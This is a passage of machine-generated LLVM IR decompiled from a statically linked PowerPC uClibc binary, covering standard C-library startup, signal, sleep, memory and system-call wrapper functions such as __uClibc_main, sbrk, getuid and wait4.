  %v0_1000ff1c = call i32 @__errno_location()
  store i32 %v0_1000ff1c, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ff1c, i32* %r29.global-to-local, align 4
  %v1_1000ff2c = inttoptr i32 %v0_1000ff1c to i32*
  %v2_1000ff2c = load i32, i32* %v1_1000ff2c, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268500792, i32* @lr, align 4
  %v3_1000ff34 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000fe48, i32 0)
  store i32 %v3_1000ff34, i32* %r3.global-to-local, align 4
  %v1_1000ff38 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000ff38 = inttoptr i32 %v1_1000ff38 to i32*
  store i32 %v2_1000ff2c, i32* %v2_1000ff38, align 4
  %v0_1000ff68.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ff68

dec_label_pc_1000ff40:                            ; preds = %dec_label_pc_1000fef8
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268500816, i32* @lr, align 4
  %v3_1000ff4c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000fe48, i32 0)
  br label %dec_label_pc_1000ff5c

dec_label_pc_1000ff5c:                            ; preds = %dec_label_pc_1000fe64, %dec_label_pc_1000ff40
  store i32 %v2_1000fe04, i32* %r3.global-to-local, align 4
  store i32 268500836, i32* @lr, align 4
  %v2_1000ff60 = call i32 @__libc_nanosleep(i32 %v2_1000fe04, i32 %v2_1000fe04)
  store i32 %v2_1000ff60, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ff60, i32* @r31, align 4
  br label %dec_label_pc_1000ff68

dec_label_pc_1000ff68:                            ; preds = %dec_label_pc_1000ff0c, %dec_label_pc_1000ff5c
  %v0_1000ff68 = phi i32 [ %v0_1000ff68.pr, %dec_label_pc_1000ff0c ], [ %v2_1000ff60, %dec_label_pc_1000ff5c ]
  %v3_1000ff68 = icmp eq i32 %v0_1000ff68, 0
  br i1 %v3_1000ff68, label %dec_label_pc_1000ff94, label %dec_label_pc_1000ff70

dec_label_pc_1000ff70:                            ; preds = %dec_label_pc_1000ff68
  %v3_1000ff80 = load i32, i32* %stack_var_-440, align 4
  %v0_1000ff84 = call i32 @__asm_mfcr()
  store i32 %v0_1000ff84, i32* %r3.global-to-local, align 4
  %v1_1000ff88 = call i32 @__asm_rlwinm(i32 %v0_1000ff84, i32 30, i32 31, i32 31)
  %v2_1000ff8c = add i32 %v3_1000ff80, %v1_1000ff88
  store i32 %v2_1000ff8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ffa0

dec_label_pc_1000ff94:                            ; preds = %dec_label_pc_1000ff68, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ffa0

dec_label_pc_1000ff9c:                            ; preds = %dec_label_pc_1000fe48, %dec_label_pc_1000fea4, %dec_label_pc_1000fe24
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ffa0

dec_label_pc_1000ffa0:                            ; preds = %dec_label_pc_1000ff94, %dec_label_pc_1000ff70, %dec_label_pc_1000fed0, %dec_label_pc_1000ff9c
  %v0_1000ffb0 = phi i32 [ 0, %dec_label_pc_1000ff94 ], [ %v2_1000ff8c, %dec_label_pc_1000ff70 ], [ %v0_1000ffb0.pre, %dec_label_pc_1000fed0 ], [ -1, %dec_label_pc_1000ff9c ]
  ret i32 %v0_1000ffb0

; uselistorder directives
  uselistorder i32 %v1_1000fea0, { 1, 0 }
  uselistorder i32 %v2_1000fe48, { 2, 1, 0, 4, 3, 5, 6 }
  uselistorder i32 %v1_1000fe20, { 1, 0 }
  uselistorder i32 %v2_1000fe04, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 2, 6, 1, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 4, 5, 2, 3, 1, 6, 7, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 0, 4, 5, 2, 3, 1, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_1000ffa0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ff9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ff68, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe90.dec_label_pc_1000fe90_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe10.dec_label_pc_1000fe10_crit_edge, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_10010004:
  %v3_10010008 = load i32, i32* @global_var_1002b94c.787, align 4
  %v3_1001000c = icmp eq i32 %v3_10010008, 0
  br i1 %v3_1001000c, label %dec_label_pc_1001001c, label %dec_label_pc_10010014

dec_label_pc_10010014:                            ; preds = %dec_label_pc_10010004
  %v2_10010018 = load i32, i32* @r4, align 4
  %v3_10010018 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10010018)
  store i32 %v3_10010018, i32* @r3, align 4
  br label %dec_label_pc_1001001c

dec_label_pc_1001001c:                            ; preds = %dec_label_pc_10010004, %dec_label_pc_10010014
  %v3_10010020 = load i32, i32* @global_var_1002b950.788, align 4
  %v3_10010024 = icmp eq i32 %v3_10010020, 0
  br i1 %v3_10010024, label %dec_label_pc_1001001c.dec_label_pc_10010034_crit_edge, label %dec_label_pc_1001002c

dec_label_pc_1001001c.dec_label_pc_10010034_crit_edge: ; preds = %dec_label_pc_1001001c
  %v0_10010044.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10010034

dec_label_pc_1001002c:                            ; preds = %dec_label_pc_1001001c
  %v2_10010030 = load i32, i32* @r4, align 4
  %v3_10010030 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10010030)
  br label %dec_label_pc_10010034

dec_label_pc_10010034:                            ; preds = %dec_label_pc_1001001c.dec_label_pc_10010034_crit_edge, %dec_label_pc_1001002c
  %v0_10010044 = phi i32 [ %v0_10010044.pre, %dec_label_pc_1001001c.dec_label_pc_10010034_crit_edge ], [ %v3_10010030, %dec_label_pc_1001002c ]
  ret i32 %v0_10010044

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010034, { 1, 0 }
  uselistorder label %dec_label_pc_1001001c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10010050 = load i32, i32* @r3, align 4
  ret i32 %v0_10010050
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268501112, i32* @lr, align 4
  %v2_10010074 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_10010078 = icmp eq i32 %v2_10010074, -1
  br i1 %v3_10010078, label %dec_label_pc_10010080, label %dec_label_pc_100100a0

dec_label_pc_10010080:                            ; preds = %entry
  %v0_10010084 = load i32, i32* @r30, align 4
  store i32 268501140, i32* @lr, align 4
  %v3_10010090 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1001a12c.789 to i32), i32 %v0_10010084)
  %v1_10010094 = load i32, i32* @r31, align 4
  %v4_10010094 = icmp eq i32 %v3_10010090, %v1_10010094
  br i1 %v4_10010094, label %dec_label_pc_100100a0, label %dec_label_pc_1001009c

dec_label_pc_1001009c:                            ; preds = %dec_label_pc_10010080
  %v1_1001009c = call i32 @abort(i32 %v3_10010090)
  br label %dec_label_pc_100100a0

dec_label_pc_100100a0:                            ; preds = %entry, %dec_label_pc_10010080, %dec_label_pc_1001009c
  %v0_100100b0 = phi i32 [ %v2_10010074, %entry ], [ %v3_10010090, %dec_label_pc_10010080 ], [ %v1_1001009c, %dec_label_pc_1001009c ]
  ret i32 %v0_100100b0

; uselistorder directives
  uselistorder label %dec_label_pc_100100a0, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100100d4 = load i32, i32* @global_var_1002b954.790, align 4
  %v3_100100d8 = icmp eq i32 %v3_100100d4, 0
  br i1 %v3_100100d8, label %dec_label_pc_100100fc, label %entry.dec_label_pc_10010120_crit_edge

entry.dec_label_pc_10010120_crit_edge:            ; preds = %entry
  %v0_10010130.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10010120

dec_label_pc_100100fc:                            ; preds = %entry
  store i32 1, i32* @global_var_1002b954.790, align 4
  store i32 4096, i32* @global_var_1002b948.764, align 4
  %v1_1001011c = call i32 @_stdio_init(i32 268487104)
  br label %dec_label_pc_10010120

dec_label_pc_10010120:                            ; preds = %entry.dec_label_pc_10010120_crit_edge, %dec_label_pc_100100fc
  %v0_10010130 = phi i32 [ %v0_10010130.pre, %entry.dec_label_pc_10010120_crit_edge ], [ %v1_1001011c, %dec_label_pc_100100fc ]
  ret i32 %v0_10010130

; uselistorder directives
  uselistorder label %dec_label_pc_10010120, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1001014c = mul i32 %arg2, 4
  %v2_10010150 = add i32 %tmp, %v1_1001014c
  %v0_10010154 = load i32, i32* @r9, align 4
  store i32 %v0_10010154, i32* @global_var_1002b940.791, align 4
  %v1_10010158 = add i32 %v2_10010150, 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10010158, i32* @global_var_1002b944.785, align 4
  store i32 %arg6, i32* @global_var_1002b950.788, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_10010178 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_10010180 = icmp eq i32 %v1_10010158, %v2_10010178
  br i1 %v4_10010180, label %dec_label_pc_10010188, label %dec_label_pc_1001018c

dec_label_pc_10010188:                            ; preds = %entry
  store i32 %v2_10010150, i32* @global_var_1002b944.785, align 4
  br label %dec_label_pc_1001018c

dec_label_pc_1001018c:                            ; preds = %entry, %dec_label_pc_10010188
  %v2_1001018c = ptrtoint i32* %stack_var_-168 to i32
  store i32 268501404, i32* @lr, align 4
  %v3_10010198 = call i32 @__GI_memset(i32 %v2_1001018c, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002b944.785, align 4
  br label %dec_label_pc_100101a8

dec_label_pc_100101a8:                            ; preds = %dec_label_pc_100101a8, %dec_label_pc_1001018c
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1001018c ], [ %v1_100101ac, %dec_label_pc_100101a8 ]
  %v1_100101a8 = inttoptr i32 %storemerge to i32*
  %v2_100101a8 = load i32, i32* %v1_100101a8, align 4
  %v1_100101ac = add i32 %storemerge, 4
  %v3_100101b0 = icmp eq i32 %v2_100101a8, 0
  br i1 %v3_100101b0, label %dec_label_pc_100101b8, label %dec_label_pc_100101a8

dec_label_pc_100101b8:                            ; preds = %dec_label_pc_100101a8
  store i32 %v1_100101ac, i32* %r29.global-to-local, align 4
  %v1_100101e412 = inttoptr i32 %v1_100101ac to i32*
  %v2_100101e413 = load i32, i32* %v1_100101e412, align 4
  %v3_100101e816 = icmp eq i32 %v2_100101e413, 0
  br i1 %v3_100101e816, label %dec_label_pc_100101f0, label %dec_label_pc_100101c0

dec_label_pc_100101c0:                            ; preds = %dec_label_pc_100101b8, %dec_label_pc_100101e0
  %v0_100101d4 = phi i32 [ %v1_100101e0, %dec_label_pc_100101e0 ], [ %v1_100101ac, %dec_label_pc_100101b8 ]
  %v0_100101c8 = phi i32 [ %v2_100101e4, %dec_label_pc_100101e0 ], [ %v2_100101e413, %dec_label_pc_100101b8 ]
  %v2_100101c0 = icmp ugt i32 %v0_100101c8, 14
  br i1 %v2_100101c0, label %dec_label_pc_100101e0, label %dec_label_pc_100101c8

dec_label_pc_100101c8:                            ; preds = %dec_label_pc_100101c0
  %v1_100101c8 = mul i32 %v0_100101c8, 8
  %v2_100101d0 = add i32 %v1_100101c8, %v2_1001018c
  store i32 %v2_100101d0, i32* @r3, align 4
  store i32 %v0_100101d4, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268501472, i32* @lr, align 4
  %v0_100101dc = call i32 @memcpy()
  %v0_100101e0.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100101e0

dec_label_pc_100101e0:                            ; preds = %dec_label_pc_100101c0, %dec_label_pc_100101c8
  %v0_100101e0 = phi i32 [ %v0_100101d4, %dec_label_pc_100101c0 ], [ %v0_100101e0.pre, %dec_label_pc_100101c8 ]
  %v1_100101e0 = add i32 %v0_100101e0, 8
  store i32 %v1_100101e0, i32* %r29.global-to-local, align 4
  %v1_100101e4 = inttoptr i32 %v1_100101e0 to i32*
  %v2_100101e4 = load i32, i32* %v1_100101e4, align 4
  %v3_100101e8 = icmp eq i32 %v2_100101e4, 0
  br i1 %v3_100101e8, label %dec_label_pc_100101f0, label %dec_label_pc_100101c0

dec_label_pc_100101f0:                            ; preds = %dec_label_pc_100101e0, %dec_label_pc_100101b8
  %v1_100101f4 = call i32 @_dl_aux_init(i32 %v2_1001018c)
  store i32 %v1_100101f4, i32* @r3, align 4
  store i32 268501500, i32* @lr, align 4
  %v1_100101f8 = call i32 @__GI___uClibc_init(i32 %v1_100101f4)
  %v3_10010200 = icmp eq i32 %tmp27, 0
  br i1 %v3_10010200, label %dec_label_pc_10010208, label %dec_label_pc_1001020c

dec_label_pc_10010208:                            ; preds = %dec_label_pc_100101f0
  br label %dec_label_pc_1001020c

dec_label_pc_1001020c:                            ; preds = %dec_label_pc_100101f0, %dec_label_pc_10010208
  %v0_10010214 = phi i32 [ %tmp27, %dec_label_pc_100101f0 ], [ 4096, %dec_label_pc_10010208 ]
  store i32 %v0_10010214, i32* @global_var_1002b948.764, align 4
  %v3_10010218 = icmp eq i32 %tmp26, -1
  br i1 %v3_10010218, label %dec_label_pc_10010220, label %dec_label_pc_10010254

dec_label_pc_10010220:                            ; preds = %dec_label_pc_1001020c
  store i32 268501540, i32* @lr, align 4
  %v1_10010220 = call i32 @getuid(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 %v1_10010220, i32* %r29.global-to-local, align 4
  store i32 268501548, i32* @lr, align 4
  %v0_10010228 = call i32 @geteuid()
  %v4_1001022c = icmp eq i32 %v1_10010220, %v0_10010228
  br i1 %v4_1001022c, label %dec_label_pc_10010234, label %dec_label_pc_10010270

dec_label_pc_10010234:                            ; preds = %dec_label_pc_10010220
  store i32 268501560, i32* @lr, align 4
  %v1_10010234 = call i32 @getgid(i32 %v0_10010228)
  store i32 %v1_10010234, i32* %r29.global-to-local, align 4
  store i32 268501568, i32* @lr, align 4
  %v0_1001023c = call i32 @getegid()
  %v4_10010240 = icmp eq i32 %v1_10010234, %v0_1001023c
  br i1 %v4_10010240, label %dec_label_pc_10010248.thread, label %dec_label_pc_10010270

dec_label_pc_10010248.thread:                     ; preds = %dec_label_pc_10010234
  br label %dec_label_pc_100102a0

dec_label_pc_10010254:                            ; preds = %dec_label_pc_1001020c
  %v4_10010258 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10010258, label %dec_label_pc_10010260, label %dec_label_pc_10010270

dec_label_pc_10010260:                            ; preds = %dec_label_pc_10010254
  br label %dec_label_pc_10010270

dec_label_pc_10010270:                            ; preds = %dec_label_pc_10010260, %dec_label_pc_10010254, %dec_label_pc_10010234, %dec_label_pc_10010220
  store i32 268501632, i32* @lr, align 4
  %v2_1001027c = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268501648, i32* @lr, align 4
  %v2_1001028c = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268501664, i32* @lr, align 4
  %v2_1001029c = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_100102a0

dec_label_pc_100102a0:                            ; preds = %dec_label_pc_10010248.thread, %dec_label_pc_10010270
  %v0_100102ac = load i32, i32* @r30, align 4
  %v1_100102ac = inttoptr i32 %v0_100102ac to i32*
  %v2_100102ac = load i32, i32* %v1_100102ac, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_100102ac, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18196) to i32*), align 4
  %v0_100102cc = load i32, i32* @r27, align 4
  store i32 %v0_100102cc, i32* @global_var_1002b94c.787, align 4
  br i1 false, label %dec_label_pc_100102d4, label %dec_label_pc_1001034c

dec_label_pc_100102d4:                            ; preds = %dec_label_pc_100102a0, %dec_label_pc_100102d4
  br i1 undef, label %dec_label_pc_100102d4, label %dec_label_pc_1001034c

dec_label_pc_1001034c:                            ; preds = %dec_label_pc_100102d4, %dec_label_pc_100102a0
  %v0_100102f8 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_100102f8)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1001035c = call i32 @__errno_location()
  %v2_10010364 = inttoptr i32 %v0_1001035c to i32*
  store i32 0, i32* %v2_10010364, align 4
  %v0_10010378 = call i32 @__GI___h_errno_location()
  %v2_10010380 = inttoptr i32 %v0_10010378 to i32*
  store i32 0, i32* %v2_10010380, align 4
  %v0_10010390 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10010390)
  %v0_1001039c = call i32 @__GI_exit()
  ret i32 %v0_1001039c

; uselistorder directives
  uselistorder i32 %v2_100101e4, { 1, 0 }
  uselistorder i32 %v1_100101e0, { 2, 1, 0 }
  uselistorder i32 %v1_100101ac, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1001018c, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 6, 5, 4, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 6, 3, 2, 1, 5, 4 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100102d4, { 1, 0 }
  uselistorder label %dec_label_pc_100102a0, { 1, 0 }
  uselistorder label %dec_label_pc_1001020c, { 1, 0 }
  uselistorder label %dec_label_pc_100101e0, { 1, 0 }
  uselistorder label %dec_label_pc_100101c0, { 1, 0 }
  uselistorder label %dec_label_pc_1001018c, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_100103ac = load i32, i32* @r3, align 4
  store i32 %v0_100103ac, i32* @r29, align 4
  %v0_100103b4 = call i32 @__errno_location()
  %v0_100103b8 = load i32, i32* @r29, align 4
  %v2_100103b8 = inttoptr i32 %v0_100103b4 to i32*
  store i32 %v0_100103b8, i32* %v2_100103b8, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100103ec = call i32 @__asm_mfcr()
  %v1_100103f0 = and i32 %v0_100103ec, 268435456
  %v3_100103f0 = icmp eq i32 %v1_100103f0, 0
  store i32 %v0_100103ec, i32* %r31.global-to-local, align 4
  br i1 %v3_100103f0, label %dec_label_pc_10010408, label %dec_label_pc_100103fc

dec_label_pc_100103fc:                            ; preds = %entry
  %v0_100103fc = call i32 @__errno_location()
  %v0_10010400 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010400 = inttoptr i32 %v0_100103fc to i32*
  store i32 %v0_10010400, i32* %v2_10010400, align 4
  br label %dec_label_pc_10010408

dec_label_pc_10010408:                            ; preds = %entry, %dec_label_pc_100103fc
  %v0_10010418 = phi i32 [ %v0_100103ec, %entry ], [ -1, %dec_label_pc_100103fc ]
  ret i32 %v0_10010418

; uselistorder directives
  uselistorder label %dec_label_pc_10010408, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010434 = call i32 @__asm_mfcr()
  %v1_10010438 = and i32 %v0_10010434, 268435456
  %v3_10010438 = icmp eq i32 %v1_10010438, 0
  store i32 %v0_10010434, i32* %r31.global-to-local, align 4
  br i1 %v3_10010438, label %dec_label_pc_10010450, label %dec_label_pc_10010444

dec_label_pc_10010444:                            ; preds = %entry
  %v0_10010444 = call i32 @__errno_location()
  %v0_10010448 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010448 = inttoptr i32 %v0_10010444 to i32*
  store i32 %v0_10010448, i32* %v2_10010448, align 4
  br label %dec_label_pc_10010450

dec_label_pc_10010450:                            ; preds = %entry, %dec_label_pc_10010444
  %v0_10010460 = phi i32 [ %v0_10010434, %entry ], [ -1, %dec_label_pc_10010444 ]
  ret i32 %v0_10010460

; uselistorder directives
  uselistorder label %dec_label_pc_10010450, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001047c = call i32 @__asm_mfcr()
  %v1_10010480 = and i32 %v0_1001047c, 268435456
  %v3_10010480 = icmp eq i32 %v1_10010480, 0
  store i32 %v0_1001047c, i32* %r31.global-to-local, align 4
  br i1 %v3_10010480, label %dec_label_pc_10010498, label %dec_label_pc_1001048c

dec_label_pc_1001048c:                            ; preds = %entry
  %v0_1001048c = call i32 @__errno_location()
  %v0_10010490 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010490 = inttoptr i32 %v0_1001048c to i32*
  store i32 %v0_10010490, i32* %v2_10010490, align 4
  br label %dec_label_pc_10010498

dec_label_pc_10010498:                            ; preds = %entry, %dec_label_pc_1001048c
  %v0_100104a8 = phi i32 [ %v0_1001047c, %entry ], [ -1, %dec_label_pc_1001048c ]
  ret i32 %v0_100104a8

; uselistorder directives
  uselistorder label %dec_label_pc_10010498, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100104c4 = call i32 @__asm_mfcr()
  %v1_100104c8 = and i32 %v0_100104c4, 268435456
  %v3_100104c8 = icmp eq i32 %v1_100104c8, 0
  store i32 %v0_100104c4, i32* %r31.global-to-local, align 4
  br i1 %v3_100104c8, label %dec_label_pc_100104e0, label %dec_label_pc_100104d4

dec_label_pc_100104d4:                            ; preds = %entry
  %v0_100104d4 = call i32 @__errno_location()
  %v0_100104d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100104d8 = inttoptr i32 %v0_100104d4 to i32*
  store i32 %v0_100104d8, i32* %v2_100104d8, align 4
  br label %dec_label_pc_100104e0

dec_label_pc_100104e0:                            ; preds = %entry, %dec_label_pc_100104d4
  %v0_100104f0 = phi i32 [ %v0_100104c4, %entry ], [ -1, %dec_label_pc_100104d4 ]
  ret i32 %v0_100104f0

; uselistorder directives
  uselistorder label %dec_label_pc_100104e0, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001050c = call i32 @__asm_mfcr()
  %v1_10010510 = and i32 %v0_1001050c, 268435456
  %v3_10010510 = icmp eq i32 %v1_10010510, 0
  store i32 %v0_1001050c, i32* %r31.global-to-local, align 4
  br i1 %v3_10010510, label %dec_label_pc_10010528, label %dec_label_pc_1001051c

dec_label_pc_1001051c:                            ; preds = %entry
  %v0_1001051c = call i32 @__errno_location()
  %v0_10010520 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010520 = inttoptr i32 %v0_1001051c to i32*
  store i32 %v0_10010520, i32* %v2_10010520, align 4
  br label %dec_label_pc_10010528

dec_label_pc_10010528:                            ; preds = %entry, %dec_label_pc_1001051c
  %v0_10010538 = phi i32 [ %v0_1001050c, %entry ], [ -1, %dec_label_pc_1001051c ]
  ret i32 %v0_10010538

; uselistorder directives
  uselistorder label %dec_label_pc_10010528, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010554 = call i32 @__asm_mfcr()
  %v1_10010558 = and i32 %v0_10010554, 268435456
  %v3_10010558 = icmp eq i32 %v1_10010558, 0
  store i32 %v0_10010554, i32* %r31.global-to-local, align 4
  br i1 %v3_10010558, label %dec_label_pc_10010570, label %dec_label_pc_10010564

dec_label_pc_10010564:                            ; preds = %entry
  %v0_10010564 = call i32 @__errno_location()
  %v0_10010568 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010568 = inttoptr i32 %v0_10010564 to i32*
  store i32 %v0_10010568, i32* %v2_10010568, align 4
  br label %dec_label_pc_10010570

dec_label_pc_10010570:                            ; preds = %entry, %dec_label_pc_10010564
  %v0_10010580 = phi i32 [ %v0_10010554, %entry ], [ -1, %dec_label_pc_10010564 ]
  ret i32 %v0_10010580

; uselistorder directives
  uselistorder label %dec_label_pc_10010570, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_100105a0 = load i32, i32* @global_var_1002b978.794, align 4
  %v3_100105a4 = icmp eq i32 %v3_100105a0, 0
  br i1 %v3_100105a4, label %dec_label_pc_100105ac, label %dec_label_pc_100105b8

dec_label_pc_100105ac:                            ; preds = %entry
  store i32 268502448, i32* @lr, align 4
  %v1_100105ac = call i32 @__GI_brk(i32 0)
  %v1_100105b0 = icmp slt i32 %v1_100105ac, 0
  br i1 %v1_100105b0, label %dec_label_pc_100105d8, label %dec_label_pc_100105ac.dec_label_pc_100105b8_crit_edge

dec_label_pc_100105ac.dec_label_pc_100105b8_crit_edge: ; preds = %dec_label_pc_100105ac
  %v0_100105b8.pre = load i32, i32* @r30, align 4
  %v3_100105bc.pre = load i32, i32* @global_var_1002b978.794, align 4
  br label %dec_label_pc_100105b8

dec_label_pc_100105b8:                            ; preds = %dec_label_pc_100105ac.dec_label_pc_100105b8_crit_edge, %entry
  %v3_100105bc = phi i32 [ %v3_100105bc.pre, %dec_label_pc_100105ac.dec_label_pc_100105b8_crit_edge ], [ %v3_100105a0, %entry ]
  %v1_100105c4 = phi i32 [ %v0_100105b8.pre, %dec_label_pc_100105ac.dec_label_pc_100105b8_crit_edge ], [ %arg1, %entry ]
  %v3_100105b8 = icmp eq i32 %v1_100105c4, 0
  store i32 %v3_100105bc, i32* @r31, align 4
  br i1 %v3_100105b8, label %dec_label_pc_100105dc, label %dec_label_pc_100105cc

dec_label_pc_100105cc:                            ; preds = %dec_label_pc_100105b8
  %v2_100105c4 = add i32 %v1_100105c4, %v3_100105bc
  store i32 268502480, i32* @lr, align 4
  %v1_100105cc = call i32 @__GI_brk(i32 %v2_100105c4)
  %tmp6 = icmp sgt i32 %v1_100105cc, -1
  br i1 %tmp6, label %dec_label_pc_100105cc.dec_label_pc_100105dc_crit_edge, label %dec_label_pc_100105d8

dec_label_pc_100105cc.dec_label_pc_100105dc_crit_edge: ; preds = %dec_label_pc_100105cc
  %v0_100105e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100105dc

dec_label_pc_100105d8:                            ; preds = %dec_label_pc_100105cc, %dec_label_pc_100105ac
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_100105dc

dec_label_pc_100105dc:                            ; preds = %dec_label_pc_100105cc.dec_label_pc_100105dc_crit_edge, %dec_label_pc_100105b8, %dec_label_pc_100105d8
  %v0_100105e0 = phi i32 [ %v0_100105e0.pre, %dec_label_pc_100105cc.dec_label_pc_100105dc_crit_edge ], [ %v3_100105bc, %dec_label_pc_100105b8 ], [ -1, %dec_label_pc_100105d8 ]
  ret i32 %v0_100105e0

; uselistorder directives
  uselistorder i32 %v3_100105bc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_100105dc, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001060c = call i32 @__asm_mfcr()
  %v1_10010610 = and i32 %v0_1001060c, 268435456
  %v3_10010610 = icmp eq i32 %v1_10010610, 0
  store i32 %v0_1001060c, i32* %r31.global-to-local, align 4
  br i1 %v3_10010610, label %dec_label_pc_10010628, label %dec_label_pc_1001061c

dec_label_pc_1001061c:                            ; preds = %entry
  %v0_1001061c = call i32 @__errno_location()
  %v0_10010620 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010620 = inttoptr i32 %v0_1001061c to i32*
  store i32 %v0_10010620, i32* %v2_10010620, align 4
  br label %dec_label_pc_10010628

dec_label_pc_10010628:                            ; preds = %entry, %dec_label_pc_1001061c
  %v0_10010638 = phi i32 [ %v0_1001060c, %entry ], [ -1, %dec_label_pc_1001061c ]
  ret i32 %v0_10010638

; uselistorder directives
  uselistorder label %dec_label_pc_10010628, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
